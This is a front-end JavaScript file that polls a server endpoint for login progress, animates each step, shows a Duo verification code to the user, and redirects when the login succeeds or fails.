/**
 * submit.js — Progress polling and animation state machine for the submit page
 */

import { animationSteps, animationUrls } from '/static/js/animationConfig.js';
import { initializeAnimation, updateAnimationVisibility } from '/static/js/animationUtils.js';

// boot up each lottie canvas
Object.entries(animationUrls).forEach(function ([step, url]) {
    initializeAnimation(animationSteps[step], url);
});

var lastStep = 1;
var lastDuoCode = '';

var stepMessages = {
    1: 'Storing your credentials securely...',
    2: 'Attempting to log in...',
    3: 'Waiting for Duo verification...',
    4: 'Login Successful! Redirecting to your dashboard...',
    5: 'Something went wrong. Redirecting...',
};

function showDuoCode(code) {
    var display = document.getElementById('duo-code-display');
    var value = document.getElementById('duo-code-value');
    var statusMessage = document.getElementById('status-message');

    value.textContent = code;
    display.classList.remove('hidden');
    statusMessage.textContent = 'Enter this code in Duo Mobile to continue';
}

function updateProgress(step, errorMsg, duoCode) {
    var stepChanged = step !== lastStep;
    var codeChanged = Boolean(duoCode) && duoCode !== lastDuoCode;
    if (!stepChanged && !codeChanged) return;

    if (stepChanged) {
        lastStep = step;
        updateAnimationVisibility(step, animationSteps);

        var statusMessage = document.getElementById('status-message');
        if (step === 5 && errorMsg) {
            statusMessage.textContent = errorMsg;
        } else if (!duoCode) {
            statusMessage.textContent = stepMessages[step] || 'Processing...';
        }
    }

    if (duoCode) {
        lastDuoCode = duoCode;
        showDuoCode(duoCode);
    }

    if (step === 4) {
        setTimeout(function () { window.location.href = '/dashboard'; }, 1000);
    } else if (step === 5) {
        setTimeout(function () { window.location.href = '/'; }, 3000);
    }
}

function pollProgress() {
    fetch('/get_progress')
        .then(function (res) { return res.json(); })
        .then(function (data) { updateProgress(data.step, data.error, data.duo_code); })
        .catch(function (err) { console.error('Error polling progress:', err); });
}

setInterval(pollProgress, 1000);
